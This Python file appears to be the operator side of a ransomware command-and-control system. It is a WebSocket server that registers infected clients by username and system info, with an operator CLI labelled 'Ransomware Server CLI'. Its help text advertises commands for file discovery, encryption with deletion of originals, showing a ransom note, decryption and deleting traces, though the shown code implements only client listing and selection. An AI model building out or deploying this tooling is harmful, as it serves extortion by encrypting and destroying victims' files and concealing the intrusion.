import asyncio
import websockets
from Connection import Connection, ConnectionState
import json

class WebSocketCLIServer:
    def __init__(self, host="localhost", port=8765):
        self.host = host
        self.port = port
        self.connected_clients: dict[str, Connection] = {}  # Map username -> Connection
        self.__server = None
        self.__should_cli_run = True
        self.__selected_client: Connection = None

    async def handler(self, websocket):
        # websocket = connection
        """Handle incoming client connections and messages."""
        # First message must be an identifier (username)
        try:
            first_message = await websocket.recv()
            username = self.__check_first_message(first_message)

            if username is None:
                await websocket.send(self.__create_auth_reply(False))
                await websocket.close()
                return
            
            # If username already exists, append a number to make it unique
            if username in self.connected_clients:
                username += str(len([x for x in self.connected_clients.keys() if x.startswith(username)])+1)
            
            # Create connection object
            connection = Connection(uri=websocket.remote_address, socket=websocket)
            connection.set_username(username)
            connection.change_state(ConnectionState.IDENTIFIED)
            connection.set_system_info(json.loads(first_message).get("data", {}).get("system", "Unknown"))
            self.connected_clients[username] = connection

            await websocket.send(self.__create_auth_reply(True))
            print(f"[{username}] is connected to the server.")

            # async for message in websocket:
            #     print(f"[{username}] {message}")
            #     await self.broadcast(f"[{username}] {message}", sender=websocket)
            await connection.start()

        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            if websocket in [conn.websocket for conn in self.connected_clients.values()]:
                print(f"[{username}] has been disconnected left")
                self.connected_clients[username].change_state(ConnectionState.DISCONNECTED)
                #del self.connected_clients[websocket]

    def __check_first_message(self, message) -> str:
        """Check if the first message is a valid username."""
        if not self.__validate_message(message, "auth_req"):
            return None
        
        data = json.loads(message).get("data", {})

        if data.get("username", None) is not None:
            return data["username"]
        
        return None
    
    def __validate_message(self, message: str, expected_type: str) -> bool:
        """Validate if the message is of the expected type."""
        try:
            msg_json = json.loads(message)
            return msg_json.get("type") == expected_type
        except json.JSONDecodeError:
            return False

    def __create_auth_reply(self, status: bool) -> str:
        """Create an authentication reply message."""
        reply = {
            "type": "auth_rep",
            "data": {
                "status": "accepted" if status else "rejected",
                "message": "Authentication successful." if status else "Authentication failed."
            }
        }
        return json.dumps(reply)

    async def __cli(self):
        """Handle CLI input from the server terminal."""
        loop = asyncio.get_event_loop()
        while self.__should_cli_run:
            cli_text = "CLI"
            if self.__selected_client:
                cli_text += f"({self.__selected_client.username})"

            msg = await loop.run_in_executor(None, input, f"{cli_text}> ")
            match msg.split():
                case ["help"]:
                    self.__show_help()
                case ["info"]:
                    print("Ransomware Server CLI")
                case ["connections"]:
                    self.__show_connections()
                case ["select", username]: 
                    if username in self.connected_clients.keys():
                        self.__selected_client = self.connected_clients[username]
                        print(f"Selected client: {username}")
                    else:
                        print(f"No client with username: {username}")
                case ["connectioninfo"]:
                    self.__show_connection_info()
                case ["exit"] | ["quit"]:  
                    print("Shutting down server...")
                    await self.close_all_clients()
                    self.__server.close()
                    self.__should_cli_run = False
                case _:
                    print(f"Unknown command: {msg}")

    
            #await self.broadcast(f"[Server CLI] {msg}")

    def __show_help(self):
        """Display available CLI commands."""
        print("Available commands:")
        print("\thelp - show this help message")
        print("\tinfo - displays information about the ransomware")
        print("\tconnections - shows all connected clients")
        print("\tselect <username> - select a client to interact with")
        print("\tconnectioninfo - shows information about the selected client")
        print("\tenvcheck - checks the environment in which the program is running")
        print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
        print("\t\tDefault is '/'")
        print("\t\tExample: directory /Users/username/Documents")
        print("\tsetup - sets up the cryptographic configuration")
        print("\t\tOptions: ") 
        print("\t\t\t--encrypt (enables encryption) ")
        print("\t\t\t--delete (deletes files after encryption/decryption)")
        print("\tencrypt - encrypts the discovered files")
        print("\transomnote - displays the ransom note to the user")
        print("\tdecrypt - decrypts the previously encrypted files")
        print("\tdeletetraces - deletes traces of the program")
        print("\ttestfunc - runs the function to be tested")
        print("\texit or quit - quit the program")

    def __show_connections(self):
        """Display all connected clients."""
        if not self.connected_clients:
            print("No clients connected.")
            return
        
        print("Connected clients:")
        for username, conn in self.connected_clients.items():
            print(f"- {username} (State: {conn.state.name})")

    def __check_selected_client(self) -> bool:
        """Check if a client is selected."""
        if self.__selected_client is None:
            print("No client selected. Use 'select <username>' to select a client.")
            return False
        return True
    
    def check_selected_client(func):
        """Decorator to ensure a client is selected before running the method."""
        def wrapper(self, *args, **kwargs):
            if getattr(self, "_WebSocketCLIServer__selected_client", None) is None:
                print("No client selected. Use 'select <username>' to select a client.")
                return
            return func(self, *args, **kwargs)
        return wrapper
    
    @check_selected_client
    def __show_connection_info(self):
        """Display information about the selected client."""
        self.__selected_client.show_info()

    async def broadcast(self, message, sender=None):
        """Send a message to all connected clients."""
        for client in list(self.connected_clients.values()):
            if client != sender:  # Don't echo back to sender if desired
                try:
                    await client.send(message)
                except websockets.exceptions.ConnectionClosed:
                    del self.connected_clients[client]

    async def close_all_clients(self):
        """Close all client connections."""
        for connection in list(self.connected_clients.values()):
            await connection.websocket.close()

    async def __start_server(self):
        """Executes the websocket server at the specificed host and port."""
        self.__server = await websockets.serve(
            self.handler,
            host = self.host,
            port = self.port,
            subprotocols=["json"]
        )
        await self.__server.wait_closed()

    async def start(self):
        """Start the WebSocket server and CLI loop."""
        print(f"WebSocket server running at ws://{self.host}:{self.port}")
        await asyncio.gather(self.__cli(), self.__start_server())


if __name__ == "__main__":
    server = WebSocketCLIServer()
    asyncio.run(server.start())
